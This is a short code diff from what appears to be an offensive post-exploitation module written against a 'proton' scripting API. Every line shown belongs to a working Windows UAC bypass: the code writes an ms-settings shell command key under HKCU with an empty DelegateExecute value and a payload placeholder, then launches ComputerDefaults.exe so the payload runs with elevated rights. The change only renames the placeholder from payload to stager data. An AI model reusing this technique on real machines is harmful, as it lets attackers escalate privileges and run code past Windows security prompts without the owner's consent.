@@ -29,7 +29,7 @@ try
 
     var path = 'Software\\Classes\\ms-settings\\shell\\open\\command';
     proton.registry.write(proton.registry.HKCU, path, 'DelegateExecute', '', proton.registry.STRING);
-    proton.registry.write(proton.registry.HKCU, path, '', '~PAYLOAD_DATA~', proton.registry.STRING);
+    proton.registry.write(proton.registry.HKCU, path, '', '~STAGER_DATA~', proton.registry.STRING);
 
     proton.shell.run("ComputerDefaults.exe", true);
 
